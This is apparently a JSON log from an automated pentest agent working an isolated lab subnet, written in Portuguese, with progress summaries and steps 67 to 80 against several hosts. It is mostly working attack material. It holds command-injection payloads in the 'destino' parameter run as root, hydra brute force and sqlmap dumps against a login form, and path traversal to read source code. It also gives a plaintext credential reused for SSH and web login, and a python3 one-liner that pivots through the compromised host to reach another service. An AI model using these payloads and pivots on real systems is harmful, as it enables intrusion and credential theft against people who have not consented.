@@ -1,0 +1,141 @@
+{
+ "partida": [
+  "Você executa a partir de 172.20.0.5 (atacante).",
+  "Sua máquina está na sub-rede 172.20.0.0/24, alcançável direto.",
+  "Restrição da ferramenta: um comando por passo, sincrono; sem processo em segundo plano."
+ ],
+ "resumos": [
+  "Resumo do progresso do pentest autorizado em laboratório isolado (sub-rede 172.20.0.0/24):\n\n**Hosts descobertos (passo 1 - nmap -sn):**\n- h01: 172.20.0.1 - sem nome, não enumerado, não comprometido\n- h02: 172.20.0.5 - atacante (origem), comprometido\n- h03: 172.20.0.10 - tcc-host-web.tcc-lab_dmz, **enumerado e comprometido**\n- h04: 172.20.0.11 - tcc-host-glhf.tcc-lab_dmz, não enumerado, não comprometido\n- h05: 172.20.0.12 - tcc-srv-deploy.tcc-lab_dmz, não enumerado, não comprometido\n\n**Host h03 (172.20.0.10) - detalhes:**\n- Serviço: 8080/tcp http-proxy, Werkzeug/3.1.9, Python/3.11.17\n- Aplicação web: \"Diagnóstico de rede -- infra interna\"\n- Rota vulnerável: `/diagnostico?destino=<alvo>` (GET) - vulnerável a **injeção de comando** via parâmetro `destino`\n- Exploração confirmada: payload `destino=172.20.0.10;<comando>` executa comandos arbitrários como **root (uid 0)**\n- Guarda de escopo ativa: rejeita IPs fora do range do laboratório (ex: 127.0.0.1 foi bloqueado)\n\n**Enumeração pós-exploração em h03:**\n- `/etc/passwd` e `/root/.ssh/id_rsa` - sem conteúdo útil retornado (vazio ou sem novos fatos)\n- `/proc/1/environ` revelou paths: `/usr/local/bin`, `/root`\n- Listagem de `/usr/local/bin` e `/root` mostrou apenas binários padrão do Python/pip e arquivos de shell comuns (.bashrc, .profile, .python_history, .wget-hsts) - nada sensível ainda\n- Busca por `*.py` e `*.env` encontrou: `/opt/diagnostico/app.py`\n- Ao tentar ler `/opt/diagnostico/app.py`, o comando revelou a existência de um arquivo adicional: **`/opt/diagnostico/config.ini`** (ainda não lido)\n\n**Próximo passo pendente:** ler o conteúdo de `/opt/diagnostico/app.py` (o conteúdo em si ainda não foi exibido/capturado) e de `/opt/diagnostico/config.ini`, que provavelmente contém credenciais ou configurações para pivotar para os hosts h04 (glhf) e h05 (deploy) ainda não enumerados/comprometidos.",
+  "Resumo do progresso do pentest autorizado na rede 172.20.0.0/24 (DMZ tcc-lab):\n\n**Hosts mapeados:**\n- h03 (172.20.0.10, tcc-srv-diagnostico): comprometido anteriormente via endpoint `/diagnostico?destino=` vulnerável a command injection. Dele foi extraída a credencial [c01] `svc_deploy:7fQx2Lm9RtVzB4kd` do arquivo `/opt/diagnostico/config.ini`.\n- h05 (172.20.0.12, tcc-srv-deploy): enumerado (nmap -sV -sC -p-) com apenas SSH (22/tcp, OpenSSH 9.2p1 Debian). A credencial c01 foi validada com sucesso via `sshpass -p <senha> ssh -tt svc_deploy@172.20.0.12`, confirmando acesso como usuário svc_deploy (uid 1000). Host marcado como **comprometido**. Enumeração pós-exploração: `sudo` não está instalado (comando ausente); `/home/svc_deploy` contém apenas dotfiles padrão (.bash_logout, .bashrc, .profile); `/opt` está vazio/sem achados relevantes; busca por arquivos relacionados a \"glhf\", chaves (.key/.pem) ou \"deploy\" não retornou nada; `ps aux` só revelou processo /usr/sbin/sshd, nada incomum. Nenhum vetor adicional de escalonamento ou pivot encontrado até agora neste host.\n- h04 (172.20.0.11, tcc-host-glhf): enumerado (nmap -sV -sC -p-), apenas porta 1337/tcp aberta, inicialmente identificada como \"waste?\" sem banner via netcat. Investigação HTTP revelou que é um servidor web:\n  - `GET /` → 302 redirect, título \"Redirecting...\"\n  - `GET /login` → 200, formulário de login\n  - `POST /login` com parâmetros `username` e `password`\n  - `GET /register` → 200 (existe rota de registro)\n  - `GET /download/readme.txt` → 200 (conteúdo lido, mas sem credenciais extraídas diretamente — precisa revisão do conteúdo textual se necessário)\n  - `GET /download/nicks.txt` → 200 (lista de possíveis usuários, baixada)\n  - `GET /download/rockyou.txt` → 200 (wordlist de senhas, baixada)\n  \n  Este host está **não comprometido** ainda; é o próximo alvo ativo.\n\n**Credenciais conhecidas:**\n- [c01] svc_deploy:7fQx2Lm9RtVzB4kd — origem h03, validada em h05 (SSH).\n\n**Próximos passos sugeridos:**\n1. Analisar conteúdo de `readme.txt`, `nicks.txt` e `rockyou.txt` baixados do host glhf (1337) para extrair contexto/usuários/senhas específicos do desafio.\n2. Montar ataque de força bruta (hydra ou similar) contra `POST /login` em 172.20.0.11:1337 usando nicks.txt como lista de usuários e rockyou.txt (ou lista reduzida) como senhas.\n3. Testar também a credencial svc_deploy (c01) diretamente no login web do host glhf, caso haja reuso de credenciais.\n4. Considerar testar a rota `/register` para criar conta própria como vetor alternativo de acesso.\n5. Caso avance no host glhf, enumerar sistema de arquivos em busca do \"troféu\" final do CTF/lab.\n6. No host h05 (deploy), caso surjam novas pistas, revisitar possíveis variáveis de ambiente, histórico de bash, ou arquivos de configuração de deploy/CI (ex.: scripts em /etc, crontab, variáveis de ambiente do processo sshd) que não foram ainda verificados.",
+  "Resumo do progresso no alvo glhf (172.20.0.11:1337), laboratório de pentest autorizado:\n\n**Credenciais obtidas:** Via hydra (hydra -L nicks.txt -P rockyou.txt contra /login com http-post-form), foi encontrada a credencial válida c02: usuário `n1ghtfox`, senha `daniel`. Essa credencial foi testada com sucesso em POST /login (HTTP 200), gerando cookie de sessão válido salvo em cookies.txt.\n\n**Wordlists:** nicks.txt e rockyou.txt foram baixadas de /download/ no próprio servidor e usadas no ataque de força bruta.\n\n**Mapeamento de rotas da aplicação (porta 1337):**\n- GET /login\n- POST /login (params: username, password)\n- GET /register\n- GET /download/readme.txt\n- GET /download/nicks.txt\n- GET /download/rockyou.txt\n- GET /user\n- GET /direct\n- GET /board\n- GET /resetdb\n- GET /logout\n\n**Testes de navegação autenticada (com cookies.txt da sessão c02):**\n- GET / com -L retorna 302 (redirecionamento, destino ainda não confirmado com certeza)\n- GET /user, /board, /direct retornaram corpos pequenos e idênticos (199 bytes) — provavelmente mensagem de erro/acesso negado padrão, conteúdo ainda não impresso/analisado em bruto.\n- GET /resetdb é o ponto mais interessante e instável: nas diversas tentativas retornou tamanhos de corpo variados (1371, 1369, 404, 3414, 2005, 3239 bytes) dependendo de sessões novas (re-login a cada tentativa). Isso sugere que /resetdb gera conteúdo dinâmico/randomizado a cada chamada ou depende de estado de sessão único-uso. Um grep por padrões (pass|key|ssh|token|user|root|glhf|172\\.) no corpo de 3414 bytes não retornou nenhuma credencial/pista clara. O conteúdo bruto completo dessa rota ainda não foi integralmente inspecionado/lido com sucesso — é um alvo prioritário pendente de análise mais cuidadosa (ex.: salvar em arquivo e abrir/analisar offline, testar múltiplas vezes para entender o padrão de variação, verificar se é JSON com dados sensíveis).\n\n**Ação mais recente:** Disparado sqlmap contra POST /login (parâmetros username e password) com --dbms=sqlite --level=3 --risk=2 --dump, no intuito de testar injeção SQL no login (hipótese de app usar SQLite, dado padrão com /resetdb e /register). O comando executou (código de saída 0, 8182 bytes de resposta), mas o resultado detalhado (se achou parâmetro injetável, se dumpou tabelas/credenciais) ainda não foi analisado nos próximos passos — é necessário revisar a saída completa do sqlmap para confirmar se há injeção confirmada e quais dados foram extraídos.\n\n**Próximos passos sugeridos:** (1) analisar minuciosamente a saída completa do sqlmap para checar vulnerabilidade e dump de dados; (2) capturar e salvar o corpo bruto completo de /resetdb em arquivo para inspeção detalhada, testando múltiplas chamadas para entender se há padrão/chave de reset útil; (3) inspecionar o conteúdo real de /user, /board, /direct (199 bytes) que ainda não foi lido na íntegra; (4) confirmar destino final do redirect 302 em GET /.",
+  "Resumo do progresso no pentest da aplicação web em 172.20.0.11:1337 (app tipo \"glhf\", parece usar SQLite):\n\n**Rotas mapeadas:** GET/POST /login, GET/POST /register, GET /download/readme.txt, /download/nicks.txt, /download/rockyou.txt, GET /user, /direct, /board, /resetdb, /logout.\n\n**Testes realizados sem sucesso:**\n- SQL injection clássica no login (`username=admin' OR '1'='1`) → não concedeu acesso (HTTP 200 mas sem indício de bypass).\n- Busca por flag/trofeu no corpo de /resetdb → nada encontrado.\n- Tentativa de mass assignment no /register injetando `role=admin` e `is_admin=true` → sem efeito aparente; ao inspecionar o HTML real do formulário /register (`/register` GET), os únicos campos existentes são username, email, password (confirmado via fato de rotas: POST /register aceita apenas username,email,password) — ou seja, mass assignment por campos extra não é viável pois o formulário não expõe campos de privilégio.\n- Login com a conta criada via mass assignment (pentester99) não resultou em elevação de privilégio visível.\n- Conteúdo de /download/readme.txt foi obtido (2322 bytes) mas ainda não foi exibido/analisado no texto da conversa — precisa ser lido na próxima iteração (pode conter pistas importantes).\n\n**Descoberta importante:** A credencial `svc_deploy / c01` (reutilizada de outro host/serviço) funcionou com sucesso no login web (`POST /login`), gerando uma sessão válida salva em `svccookies.txt`. As páginas autenticadas como svc_deploy retornam corpos maiores que os de usuário comum (`/user` = 2071 bytes vs 199 bytes do usuário n1ghtfox; `/board` e `/direct` = 622 bytes cada), indicando que essa conta tem acesso elevado ou conteúdo diferenciado — **mas o conteúdo textual real dessas páginas ainda não foi visualizado/confirmado**, pois os comandos que tentaram salvar com `tee`/`cat`/pipe para grep falharam (o executor de \"curl\" parece não suportar encadeamento de comandos via `&&`, `|`, `tee`, `cat` — só executa curl isolado com argumentos simples).\n\n**Próximos passos recomendados:**\n1. Executar `curl -s http://172.20.0.11:1337/download/readme.txt` isoladamente (sem pipe) e revisar o texto completo retornado — já foi buscado mas o conteúdo não foi lido ainda.\n2. Reemitir `curl -s -b svccookies.txt http://172.20.0.11:1337/user` (comando único, sem `&&`/pipe) e ler o corpo completo no retorno; repetir separadamente para /board e /direct, pois os cookies de sessão (svccookies.txt) já estão salvos localmente e válidos.\n3. Evitar combinar múltiplos comandos curl com `&&`, `|`, `tee`, `cat`, `grep` em uma única ação — o ambiente de execução falha (código 1) nesses casos; usar uma chamada curl por ação e inspecionar o resultado bruto diretamente.\n4. Se necessário filtrar texto, considerar usar apenas opções nativas do curl (como já feito) e ler o corpo manualmente, já que grep/cat externos não estão funcionando no executor atual.",
+  "**Resumo do progresso do pentest (passos 54-66):**\n\n**Hosts mapeados:**\n- **h01** (172.20.0.1): enumerado via nmap, expõe apenas rpcbind (111/tcp) e rpc.statd (55263/tcp). Scripts NFS (rpcinfo, nfs-showmount, nfs-ls) executados mas sem exports/montagens relevantes encontrados. Não comprometido, parece sem vetor de ataque viável.\n- **h03** (172.20.0.10:8080): possui RCE confirmado como **root** via injeção de comando no endpoint `/diagnostico?destino=`. Última tentativa de usar esse RCE para buscar arquivos de flag/troféu (`find / -iname '*flag*' ...`) **falhou com curl código 3**, provavelmente por problema de URL-encoding dos caracteres especiais (`;`, aspas, espaços) — precisa ser corrigido/re-tentado com encoding adequado ou usando `--data-urlencode`.\n- **h04** (172.20.0.11:1337 - app \"glhf\"): aplicação web com rotas `/login`, `/board`, `/direct`, `/user`, `/download/<arquivo>`, usa backend SQLite.\n  - Credencial válida descoberta: **svc_deploy / c01** (login bem-sucedido, cookies salvos em svc2.txt, svc3.txt, svc4.txt).\n  - Sessões autenticadas como svc_deploy acessam `/direct` retornando corpos maiores (1872-2071 bytes) que **nunca foram exibidos com sucesso** — todas as tentativas de grep para palavras-chave (flag, trofeu, CTF, FLAG{, secret, etc.) falharam por não haver match ou por erro de pipe (código 1), mas o conteúdo bruto do HTML nunca foi impresso/inspecionado diretamente.\n  - `/board` com sessão autenticada retorna 199 bytes, ainda não visualizado em bruto.\n  - **Path traversal confirmado** em `/download/../app.py`, retornando 1368 bytes (código-fonte da aplicação) — porém o conteúdo nunca foi exibido com sucesso; tentativa de filtrar com grep (rotas, SECRET_KEY, eval, exec etc.) falhou com código 1 (sem saída).\n  - `/flag` testado diretamente, retorna 1366 bytes mas conteúdo não inspecionado.\n  - sqlmap executado múltiplas vezes contra `/login` (parâmetros username/password) com `--dbms=sqlite --level=3 --risk=2 --batch --dump`, execuções retornaram código 0 e respostas de ~2-8KB, mas o **conteúdo dumpado (tabelas/usuários) nunca foi efetivamente exibido/parseado** nos resultados — necessário revisar logs do sqlmap diretamente ou salvar output em arquivo.\n- **h05**: mencionado como esgotado em termos de vetores, sem detalhes adicionais nesse trecho.\n\n**Problema recorrente identificado:** repetidas tentativas de usar `curl ... | grep ...` falham silenciosamente (código 1 = sem match) ou os bytes de corpo são reportados mas o conteúdo HTML/texto bruto nunca é efetivamente capturado/exibido para análise. É necessário mudar a abordagem: salvar respostas em arquivo e exibir com `cat` separadamente, ou usar `grep -v` inexistente, ou remover pipes problemáticos, garantindo que o conteúdo real das respostas (especialmente de `/direct`, `/board`, `/download/../app.py`, `/flag`, e do dump do sqlmap) seja finalmente lido.\n\n**Próximos passos recomendados:**\n1. Corrigir a sintaxe de comando RCE em h03 (usar aspas/encoding correto) para completar a busca por flag como root.\n2. Salvar e exibir diretamente (sem grep problemático) o conteúdo de `/download/../app.py`, `/direct`, `/board` e `/flag` com sessão svc_deploy em h04.\n3. Revisar a saída completa do sqlmap (sem pipe) para extrair credenciais/tabelas dumpadas do SQLite."
+ ],
+ "passos": [
+  {
+   "numero": 67,
+   "ferramenta": "curl",
+   "comando": "curl -s -G \"http://172.20.0.10:8080/diagnostico\" --data-urlencode \"destino=172.20.0.10;find / -iregex '.*\\(flag\\|trofeu\\|trophy\\).*' 2>/dev/null\"",
+   "justificativa": "O comando anterior falhou por URL malformada (caracteres especiais não escapados); usando -G com --data-urlencode o curl codifica corretamente espaços, ponto-e-vírgula e parênteses, permitindo finalmente executar a busca global por flag/trofeu como root em h03 sem quebrar a requisição HTTP.",
+   "resumo": "http nao observado, 761 bytes de corpo, 0 credencial(is); saida: nenhum fato novo",
+   "fatos": []
+  },
+  {
+   "numero": 68,
+   "ferramenta": "curl",
+   "comando": "curl -s -G \"http://172.20.0.10:8080/diagnostico\" --data-urlencode \"destino=172.20.0.10;ls -la /\"",
+   "justificativa": "Ainda não listamos a raiz do sistema de arquivos como root; uma listagem simples de / pode revelar diretamente um arquivo de troféu/flag que os filtros 'find' com nomes específicos não capturaram.",
+   "resumo": "http nao observado, 1362 bytes de corpo, 0 credencial(is); saida: 13 caminhos novos, 4 nao guardados",
+   "fatos": [
+    " caminhos vistos: /usr/local/bin, /root, /root/.bashrc, /root/.profile, /root/.python_history, /root/.wget-hsts, /usr/local/bin/2to3, /usr/local/bin/2to3-3.11, /usr/local/bin/flask, /usr/local/bin/idle, /usr/local/bin/idle3, /usr/local/bin/idle3.11, /usr/local/bin/pip, /usr/local/bin/pip3, /usr/local/bin/pip3.11, /usr/local/bin/pydoc, /usr/local/bin/pydoc3, /usr/local/bin/pydoc3.11, /usr/local/bin/python, /usr/local/bin/python-config, /usr/local/bin/python3, /opt/diagnostico/app.py, /opt/diagnostico/config.ini, /.dockerenv, /bin, /boot, /dev, /etc, /home, /lib, /lib64, /media, /mnt, /opt, /run, /sbin, /srv, /tmp, /usr, /var"
+   ]
+  },
+  {
+   "numero": 69,
+   "ferramenta": "curl",
+   "comando": "curl -s -G \"http://172.20.0.10:8080/diagnostico\" --data-urlencode \"destino=172.20.0.10;showmount -e 172.20.0.1\"",
+   "justificativa": "h03 tem RCE root e pode alcançar h01; usar seu shell para enumerar exports NFS de h01, já que o scan direto do atacante não revelou detalhes de showmount/exports.",
+   "resumo": "http nao observado, 297 bytes de corpo, 0 credencial(is); saida: ferramenta ausente neste host: showmount",
+   "fatos": []
+  },
+  {
+   "numero": 70,
+   "ferramenta": "curl",
+   "comando": "curl -s http://172.20.0.11:1337/download/readme.txt",
+   "justificativa": "O conteúdo de readme.txt nunca foi efetivamente exibido/analisado nos passos anteriores; pode conter pistas textuais (usuário, rota oculta, ou até o próprio troféu) que ainda não foram exploradas, ao contrário de /user,/board,/direct já exauridos.",
+   "resumo": "http nao observado, 2322 bytes de corpo, 0 credencial(is)",
+   "fatos": []
+  },
+  {
+   "numero": 71,
+   "ferramenta": "curl",
+   "comando": "curl -s -b svc3.txt http://172.20.0.11:1337/resetdb",
+   "justificativa": "A sessao privilegiada svc_deploy (svc3.txt) ainda nao foi testada especificamente contra /resetdb, que mostrou tamanhos de corpo variaveis e comportamento dinamico; testar com credencial de maior privilegio pode revelar o conteudo/estado diferenciado (possivel trofeu ou painel admin) que sessoes comuns nao expuseram.",
+   "resumo": "http nao observado, 1369 bytes de corpo, 0 credencial(is)",
+   "fatos": []
+  },
+  {
+   "numero": 72,
+   "ferramenta": "nmap",
+   "comando": "nmap -p111,55263 --script=nfs-showmount 172.20.0.1",
+   "justificativa": "O scan combinado anterior (rpcinfo+nfs-showmount+nfs-ls) não revelou exports; isolar apenas nfs-showmount pode finalmente listar os caminhos exportados por h01, único host ainda com superfície NFS não esclarecida enquanto h03/h04/h05 parecem esgotados.",
+   "resumo": "1 hosts, 2 servicos",
+   "fatos": [
+    " servicos: 111/tcp rpcbind 2-4 (RPC #100000); 55263/tcp unknown 1 (RPC #100024)"
+   ]
+  },
+  {
+   "numero": 73,
+   "ferramenta": "curl",
+   "comando": "curl -s -G \"http://172.20.0.10:8080/diagnostico\" --data-urlencode \"destino=172.20.0.10;ls -la /var/run /run/docker.sock 2>&1\"",
+   "justificativa": "h03 roda em container (.dockerenv presente); verificar se o socket Docker esta montado pode permitir escape para o host subjacente (h01), vetor ainda nao testado e mais promissor que insistir em glhf/deploy ja esgotados.",
+   "resumo": "http nao observado, 378 bytes de corpo, 0 credencial(is); saida: 1 nao guardados",
+   "fatos": [
+    " caminhos vistos: /usr/local/bin, /root, /root/.bashrc, /root/.profile, /root/.python_history, /root/.wget-hsts, /usr/local/bin/2to3, /usr/local/bin/2to3-3.11, /usr/local/bin/flask, /usr/local/bin/idle, /usr/local/bin/idle3, /usr/local/bin/idle3.11, /usr/local/bin/pip, /usr/local/bin/pip3, /usr/local/bin/pip3.11, /usr/local/bin/pydoc, /usr/local/bin/pydoc3, /usr/local/bin/pydoc3.11, /usr/local/bin/python, /usr/local/bin/python-config, /opt/diagnostico/app.py, /opt/diagnostico/config.ini, /.dockerenv, /bin, /boot, /dev, /etc, /home, /lib, /lib64, /media, /mnt, /opt, /run, /sbin, /srv, /tmp, /usr, /var, /var/run"
+   ]
+  },
+  {
+   "numero": 74,
+   "ferramenta": "ssh",
+   "comando": "find / -perm -4000 -type f 2>/dev/null",
+   "justificativa": "Ainda não foram enumerados binários SUID em h05; como sudo está ausente, um SUID mal configurado é o vetor de escalonamento mais provável ainda não testado nesse host.",
+   "resumo": "ssh falhou (codigo 1): /usr/lib/openssh/ssh-keysign; sessao estabelecida; saida: 9 caminhos novos",
+   "fatos": [
+    " caminhos vistos: /home/svc_deploy, /opt, /home/svc_deploy/.bash_logout, /home/svc_deploy/.bashrc, /home/svc_deploy/.profile, /usr/sbin/sshd, /usr/lib/openssh/ssh-keysign, /usr/bin/chsh, /usr/bin/chfn, /usr/bin/newgrp, /usr/bin/mount, /usr/bin/su, /usr/bin/umount, /usr/bin/gpasswd, /usr/bin/passwd"
+   ]
+  },
+  {
+   "numero": 75,
+   "ferramenta": "curl",
+   "comando": "curl -s -G \"http://172.20.0.10:8080/diagnostico\" --data-urlencode \"destino=172.20.0.10;grep -rIl 'FLAG{' / 2>/dev/null\"",
+   "justificativa": "Busca por conteudo (nao apenas nome de arquivo) do padrao de flag em todo o filesystem como root via RCE confirmado, ja que buscas por nome de arquivo falharam anteriormente.",
+   "resumo": "http nao observado, 259 bytes de corpo, 0 credencial(is); saida: nenhum fato novo",
+   "fatos": []
+  },
+  {
+   "numero": 76,
+   "ferramenta": "curl",
+   "comando": "curl -s -G \"http://172.20.0.10:8080/diagnostico\" --data-urlencode \"destino=172.20.0.10;cat /opt/diagnostico/app.py\"",
+   "justificativa": "O conteúdo real do código-fonte app.py nunca foi exibido; pode revelar rotas ocultas, lógica de flag ou pistas adicionais para pivotar, via RCE root já confirmado.",
+   "resumo": "http nao observado, 6700 bytes de corpo, 0 credencial(is); saida: nenhum fato novo",
+   "fatos": []
+  },
+  {
+   "numero": 77,
+   "ferramenta": "curl",
+   "comando": "curl -s -b svc3.txt http://172.20.0.11:1337/flag",
+   "justificativa": "A rota /flag em glhf nunca foi efetivamente inspecionada com sessao privilegiada svc_deploy; e o candidato mais direto para conter o trofeu do laboratorio.",
+   "resumo": "http nao observado, 1366 bytes de corpo, 0 credencial(is)",
+   "fatos": []
+  },
+  {
+   "numero": 78,
+   "ferramenta": "curl",
+   "comando": "curl -s -G \"http://172.20.0.10:8080/diagnostico\" --data-urlencode \"destino=172.20.0.10;grep -ni flag /opt/diagnostico/app.py\"",
+   "justificativa": "cat completo do app.py nao revelou fatos extraiveis; filtrar diretamente por 'flag' no codigo-fonte via RCE root pode isolar a linha/variavel que contem o trofeu, algo que buscas por nome de arquivo ou padrao 'FLAG{' em todo o FS nao capturaram.",
+   "resumo": "http nao observado, 259 bytes de corpo, 0 credencial(is); saida: nenhum fato novo",
+   "fatos": []
+  },
+  {
+   "numero": 79,
+   "ferramenta": "curl",
+   "comando": "curl -s -G \"http://172.20.0.10:8080/diagnostico\" --data-urlencode \"destino=172.20.0.10;curl -s -c /tmp/ck.txt -d 'username=svc_deploy&password=7fQx2Lm9RtVzB4kd' http://172.20.0.11:1337/login -o /dev/null; curl -s -b /tmp/ck.txt http://172.20.0.11:1337/flag | grep -oE 'FLAG\\{[^}]*\\}'\"",
+   "justificativa": "Usar o RCE root confirmado em h03 (que suporta shell completo com pipes) para logar como svc_deploy no app glhf e extrair diretamente o padrao FLAG{...} da rota /flag, contornando a limitacao do wrapper curl do atacante que nao permite pipes/grep; isso finalmente revela o conteudo textual do trofeu nunca lido nas tentativas anteriores.",
+   "resumo": "http nao observado, 325 bytes de corpo, 0 credencial(is); saida: ferramenta ausente neste host: curl",
+   "fatos": []
+  },
+  {
+   "numero": 80,
+   "ferramenta": "curl",
+   "comando": "curl -s -G \"http://172.20.0.10:8080/diagnostico\" --data-urlencode \"destino=172.20.0.10;python3 -c \\\"import urllib.request,urllib.parse; data=urllib.parse.urlencode({'username':'svc_deploy','password':'7fQx2Lm9RtVzB4kd'}).encode(); req=urllib.request.Request('http://172.20.0.11:1337/login',data=data); op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor()); op.open(req); r=op.open('http://172.20.0.11:1337/flag'); print(r.read().decode())\\\"\"",
+   "justificativa": "curl está ausente em h03, mas python3 está instalado; usar python para logar como svc_deploy no app glhf e buscar /flag via RCE root, contornando a limitação de ferramentas e finalmente lendo o conteúdo bruto da rota candidata ao troféu.",
+   "resumo": "http nao observado, 1087 bytes de corpo, 0 credencial(is); saida: 1 nao guardados",
+   "fatos": [
+    " caminhos vistos: /usr/local/bin, /root, /root/.bashrc, /root/.profile, /root/.python_history, /root/.wget-hsts, /usr/local/bin/2to3, /usr/local/bin/2to3-3.11, /usr/local/bin/flask, /usr/local/bin/idle, /usr/local/bin/idle3, /usr/local/bin/idle3.11, /usr/local/bin/pip, /usr/local/bin/pip3, /usr/local/bin/pip3.11, /usr/local/bin/pydoc, /usr/local/bin/pydoc3, /usr/local/bin/pydoc3.11, /usr/local/bin/python, /opt/diagnostico/app.py, /opt/diagnostico/config.ini, /.dockerenv, /bin, /boot, /dev, /etc, /home, /lib, /lib64, /media, /mnt, /opt, /run, /sbin, /srv, /tmp, /usr, /var, /var/run, /usr/local/lib/python3.11/urllib/request.py"
+   ]
+  }
+ ],
+ "chamadas_de_resumo": 5,
+ "entrada_tokens": 15150,
+ "saida_tokens": 7480
+}
